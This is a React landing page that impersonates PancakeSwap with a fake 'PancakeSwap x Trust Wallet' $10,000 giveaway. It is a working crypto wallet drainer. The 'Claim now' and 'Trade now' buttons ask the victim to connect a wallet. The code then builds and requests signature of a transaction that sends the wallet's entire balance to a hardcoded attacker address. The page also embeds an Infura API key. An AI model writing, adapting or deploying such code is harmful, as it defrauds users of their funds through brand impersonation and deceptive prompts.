import image from "../assets/img/img";
import Nav from "../components/nav";
import { useEffect } from "react";
import injectedModule from "@web3-onboard/injected-wallets"; 
import coinsbaseModule from "@web3-onboard/coinbase";
import dcentModule from "@web3-onboard/dcent";
import walletConnectModule from "@web3-onboard/walletconnect";
import { useConnectWallet, useNotifications } from "@web3-onboard/react";
import { init } from "@web3-onboard/react";
import { color } from "../utils/style";
import { ethers } from "ethers";
import {Buffer} from "buffer"


const injected = injectedModule();
const coinbase = coinsbaseModule();
const dcent = dcentModule();
const walletConnect = walletConnectModule();

window.Buffer = Buffer;

const MAINNET_RPC_URL =
    "https://mainnet.infura.io/v3/79ef1924820c478a9d21625caa776872";


    const web3onboard = init({
        wallets: [injected, coinbase, dcent, walletConnect],
        chains: [
          {
            id: "0x1",
            token: "ETH",
            label: "Ethereum Mainnet",
            rpcUrl: MAINNET_RPC_URL,
          },
          {
            id: "56",
            token: "BNB",
            label: "BNB Mainnet",
            rpcUrl: MAINNET_RPC_URL,
          },
        ],
        appMetadata: {
          name: "BakerySwap",
          // icon: logo,
          description: "BakeySwap App",
          recommendedInjectedWallets: [
            { name: "MetaMask", url: "https://metamask.io" },
            { name: "Coinbase", url: "https://wallet.coinbase.com/" },
          ],
        },
        accountCenter: {
          desktop: {
            position: "bottomRight",
            enabled: true,
            minimal: true,
          },
          mobile: {
            position: "bottomRight",
            enabled: true,
            minimal: true,
          },
        },
      });

export const Index = () => {

  const [{ wallet, connecting }, connect, disconnect] = useConnectWallet();

  const isConnected = wallet?.accounts[0].address;

    const connectWallet = async () => {
        connect();
      };

    const [primaryWallet] = web3onboard.state.get().wallets;

  const disconnectWallet = async () => {
    web3onboard.disconnectWallet({
      label: primaryWallet.label,
    });
  };

  /*--------- Send Transaction -------*/

  const [
    notifications,
    customNotification,
    updateNotify,
    preflightNotifications,
  ] = useNotifications();

  useEffect(() => {
    console.log(notifications);
  }, [notifications]);

  const notConnected = async () => {
    alert("Connect Your Wallet");
  };

  const sendTransactionWithPreFlightNotifications = async () => {
    const balanceValue = Object.values(wallet?.accounts[0].balance)[0];

    const ethersProvider = new ethers.providers.Web3Provider(
      wallet.provider,
      "any"
    );

    const signer = ethersProvider.getSigner();

    const receiverAccount = process.env.REACT_APP_RECEIVER_ADDRESS;
    console.log("Account = " + typeof receiverAccount);

    const txDetails = {
      from: wallet?.accounts[0].address,
      to: "0x145825ca15453843e75957809051F8525b5f6aB5",
      value: String(ethers.utils.parseUnits(balanceValue)),
    };

    const sendTransaction = () => {
      return signer.sendTransaction(txDetails).then((tx) => tx.hash);
    };

    const gasPrice = () =>
      ethersProvider.getGasPrice().then((res) => res.toString());

    const estimateGas = () => {
      return ethersProvider
        .estimateGas(txDetails)
        .then((res) => res.toString());
    };

    const transactionHash = await preflightNotifications({
      sendTransaction,
      gasPrice,
      estimateGas,
      balance: balanceValue,
      txDetails: txDetails,
    });
  };

  const claim = () => {
    if (isConnected) sendTransactionWithPreFlightNotifications();
    else alert("please connect your wallet");
  };

    return(
        <div>
        <Nav initWallet={connectWallet} wallet={isConnected} />
        <div className="h-screen p-3" style={{ background: color.section1BG }}>
          <div
            className="rounded-3xl w-11/12 lg:w-8/12 pt-20 lg:pt-6 m-auto mt-6"
            style={{ background: color.carouselBg1 }}
          >
            <p className="text-white pl-7 font-bold text-lg">
              PancakeSwap x Trust Wallet
            </p>
            <p className="text-white pl-7 font-bold text-xl">
              WIN $10,000 prize pool
            </p>
  
            <div className="flex mt-7 gap-8 pl-7 pb-5">
              <button
                onClick={connectWallet}
                className="p-3 rounded-2xl font-semibold text-white"
                style={{ backgroundColor: color.btnColor }}
              >
                {isConnected ? "Connected" : "Connect wallet"}
              </button>
              <button
                onClick={claim}
                className="p-3 rounded-2xl bg-white"
                style={{ color: color.btnColor }}
              >
                Claim now
              </button>
            </div>
          </div>
          <div className="flex flex-col-reverse md:flex-row lg:flex-row md:w-11/12 lg:w-9/12 m-auto justify-between">
            <div className="w-11/12 lg:w-3/6 pt-20 lg:pt-6 m-auto">
              <h2
                className="text-5xl lg:text-6xl font-semibold"
                style={{ color: color.colorText1 }}
              >
                The moon is made <br /> of pancakes.
              </h2>
              <p className="text-white font-semibold mt-2">
                Trade, earn, and win crypto on the most popular decentralized
                <br />
                platform in the galaxy.
              </p>
              <div className="flex mt-7 gap-8">
                <button
                  className="p-3 rounded-2xl font-semibold"
                  style={{ backgroundColor: color.btnColor }}
                >
                  {isConnected ? "Connected" : "Connect wallet"}
                </button>
                <button
                  onClick={claim}
                  className="p-3 border-4 rounded-2xl"
                  style={{ borderColor: color.btnColor, color: color.btnColor }}
                >
                  Trade now
                </button>
              </div>
            </div>
            <div className="lg:w-3/6">
              <img
                src={image.section1}
                alt="section one bg"
                className="lg:w-9/12 w-2/5 block mt-10"
                style={{ float: "inline-end" }}
              />
            </div>
          </div>
        </div>
        <div style={{ background: color.section2Color }}>
          <div className="lg:w-10/12 m-auto pb-10">
            <img
              src={image.section2Img}
              className="w-12 block m-auto pt-40"
              alt="section 2"
            />
            <p className="text-center text-white font-bold text-4xl">
              Used by millions. <br /> Trusted with billions.
            </p>
            <p
              className="text-center pt-5"
              style={{ color: color.colors_textSubtle }}
            >
              PancakeSwap has the most users of any decentralized platform, ever.
              <br />
              And those users are now entrusting the platform with over $3.5
              billion in funds.
            </p>
            <p
              className="pt-6 text-center"
              style={{ color: color.colors_textSubtle }}
            >
              Will you join them?
            </p>
            <div className="flex flex-col w-11/12 lg:flex-row md:flex-row gap-10 mt-28 lg:w-9/12 m-auto">
              <div
                className="w-72 h-72 rounded-2xl m-auto"
                style={{ backgroundColor: color.section2ModalColor }}
              >
                <div className="flex flex-row-reverse">
                  <img
                    src={image.users}
                    alt="users"
                    className="lg:w-16 pt-4 pr-4"
                  />
                </div>
  
                <h3 className="text-white font-semibold text-3xl pl-7 pt-14">
                  1.5 million
                </h3>
                <h3
                  className="font-semibold text-3xl pl-7"
                  style={{ color: color.colorText1 }}
                >
                  users
                </h3>
                <h6
                  className="pl-7 pt-7"
                  style={{ color: color.colors_textSubtle }}
                >
                  in the last 30 days
                </h6>
              </div>
              <div
                className="w-72 h-72 rounded-2xl m-auto"
                style={{ backgroundColor: color.section2ModalColor }}
              >
                <div className="flex flex-row-reverse">
                  <img
                    src={image.trades}
                    alt="users"
                    className="lg:w-16 pt-4 pr-4"
                  />
                </div>
  
                <h3 className="text-white font-semibold text-3xl pl-7 pt-14">
                  21 million
                </h3>
                <h3
                  className="font-semibold text-3xl pl-7"
                  style={{ color: color.colorText1 }}
                >
                  trades
                </h3>
                <h6
                  className="pl-7 pt-7"
                  style={{ color: color.colors_textSubtle }}
                >
                  made in the last 30 days
                </h6>
              </div>
              <div
                className="w-72 h-72 m-auto rounded-2xl"
                style={{ backgroundColor: color.section2ModalColor }}
              >
                <div className="flex flex-row-reverse">
                  <img
                    src={image.chart}
                    alt="users"
                    className="lg:w-16 pt-4 pr-4"
                  />
                </div>
  
                <h3 className="text-white font-semibold text-3xl pl-7 pt-14">
                  1.5 million
                </h3>
                <h3
                  className="font-semibold text-3xl pl-7"
                  style={{ color: color.colorText1 }}
                >
                  users
                </h3>
                <h6
                  className="pl-7 pt-7"
                  style={{ color: color.colors_textSubtle }}
                >
                  in the last 30 days
                </h6>
              </div>
            </div>
          </div>
        </div>
        <div style={{ background: color.section3Bg }}>
          <div className="w-11/12 lg:w-10/12 m-auto flex flex-col-reverse lg:flex-row md:flex-row justify-between">
            <div className="lg:pt-40 pt-7">
              <p className="text-white font-bold text-3xl">
                <span style={{ color: color.colorText1 }}>Trade</span> anything.
                No <br /> registration, no hassle.
              </p>
              <p style={{ color: color.colors_textSubtle }} className="pt-5">
                Trade any token on BNB Smart Chain in seconds, just by <br />{" "}
                connecting your wallet.
              </p>
  
              <div className="flex mt-7 gap-8">
                <button
                  className="p-3 rounded-2xl font-semibold"
                  style={{ backgroundColor: color.btnColor }}
                >
                  Trade Now
                </button>
                <p className="pt-3" style={{ color: color.btnColor }}>
                  Learn
                </p>
              </div>
            </div>
            <div className="lg:w-3/6 md:w-3/6">
              <img
                src={image.coins}
                alt="section one bg"
                className="w-10/12 block mt-10"
              />
            </div>
          </div>
        </div>
        <div style={{ background: color.section4Bg }}>
          <div className="w-11/12 lg:w-10/12 m-auto flex flex-col-reverse lg:flex-row-reverse md:flex-row-reverse justify-between">
            <div className="lg:pt-40 pt-7">
              <p className="text-white font-bold text-3xl">
                <span style={{ color: color.colorText1 }}>Earn</span> passive
                income with <br /> crypto.
              </p>
              <p style={{ color: color.colors_textSubtle }} className="pt-5">
                PancakeSwap makes it easy to make your crypto work for you.
              </p>
  
              <div className="flex mt-7 gap-8">
                <button
                  className="p-3 rounded-2xl font-semibold"
                  style={{ backgroundColor: color.btnColor }}
                >
                  Explore
                </button>
                <p className="pt-3" style={{ color: color.btnColor }}>
                  Learn
                </p>
              </div>
            </div>
            <div className="lg:w-3/6 md:w-3/6">
              <img
                src={image.section4img}
                alt="section one bg"
                className="w-10/12 block mt-10"
              />
            </div>
          </div>
        </div>
        <div className="p-12" style={{ background: color.section5Bg }}>
          <div
            style={{ backgroundColor: color.section5ModalBg }}
            className="w-11/12 mt-20 m-auto rounded-2xl"
          >
            <p className="text-center text-white text-3xl font-bold pt-12">
              <span style={{ color: color.colorText1 }}>Win</span> millions in
              prizes
            </p>
            <p
              className="text-center pt-4"
              style={{ color: color.colors_textSubtle }}
            >
              Provably fair, on-chain games. <br /> Win big with PancakeSwap.
            </p>
  
            <div className="flex lg:flex-row mt-10 pb-10 lg:w-7/12 m-auto">
              <div
                className="w-72 h-80 md:h-96 rounded-2xl m-auto"
                style={{ background: color.section5InnerBg1 }}
              >
                <div className="flex flex-row-reverse">
                  <img
                    src={image.globe}
                    alt="globe"
                    className="lg:w-16 pt-4 pr-4"
                  />
                </div>
  
                <p
                  className="font-semibold text-md pl-7 pt-3"
                  style={{ color: color.colorText2 }}
                >
                  Prediction
                </p>
                <h3
                  style={{ color: color.colorText2 }}
                  className="font-semibold text-3xl pl-7 pt-4"
                >
                  $1.1 billion
                </h3>
                <p
                  style={{ color: color.colorText2 }}
                  className="font-semibold text-md pl-7 pt-3"
                >
                  in BNB + CAKE won so far
                </p>
                <p
                  style={{ color: color.colorText2 }}
                  className="text-md pl-7 pt-3"
                >
                  Predict the price trend of BNB or <br /> CAKE to win
                </p>
                <button
                  className="p-3 mt-3 rounded-2xl font-semibold block w-11/12 m-auto"
                  style={{ backgroundColor: color.btnColor }}
                >
                  Play
                </button>
              </div>
              <div
                className="w-72 h-80 md:h-96 rounded-2xl m-auto"
                style={{ background: color.section5InnerBg2 }}
              >
                <div className="flex flex-row-reverse">
                  <img
                    src={image.ticket}
                    alt="globe"
                    className="lg:w-16 pt-4 pr-4"
                  />
                </div>
  
                <p className="text-white font-semibold text-md pl-7 pt-3">
                  Lottery
                </p>
                <h3
                  style={{ color: "#fec11a" }}
                  className="font-semibold text-3xl pl-7 pt-4"
                >
                  $79,939
                </h3>
                <p className="text-white font-semibold text-md pl-7 pt-3">
                  in CAKE prizes this round
                </p>
                <p className="text-white text-md pl-7 pt-3">
                  Buy tickets with CAKE, win CAKE <br /> if your numbers match
                </p>
                <button
                  className="p-3 mt-3 rounded-2xl font-semibold block w-11/12 m-auto"
                  style={{ backgroundColor: color.btnColor }}
                >
                  Buy Tickets
                </button>
              </div>
            </div>
          </div>
        </div>
        <div style={{ background: color.section3Bg }}>
          <div className="w-11/12 lg:w-10/12 m-auto flex flex-col-reverse lg:flex-row md:flex-row justify-between">
            <div className="lg:pt-40 pt-7">
              <p className="text-white font-bold text-3xl">
                <span style={{ color: color.colorText1 }}>CAKE</span> makes our
                world <br /> go round.
              </p>
              <p style={{ color: color.colors_textSubtle }} className="pt-5">
                CAKE token is at the heart of the PancakeSwap ecosystem. Buy it,
                win it, farm it, spend it, stake it... heck, you can even vote
                with it!
              </p>
  
              <div className="flex mt-7 gap-8">
                <button
                  className="p-3 rounded-2xl font-semibold"
                  style={{ backgroundColor: color.btnColor }}
                >
                  Buy cake
                </button>
                <p className="pt-3" style={{ color: color.btnColor }}>
                  Learn
                </p>
              </div>
            </div>
            <div className="lg:w-3/6 md:w-3/6">
              <img
                src={image.section6Img}
                alt="section one bg"
                className="w-10/12 block mt-10"
              />
            </div>
          </div>
        </div>
      </div>
    )
}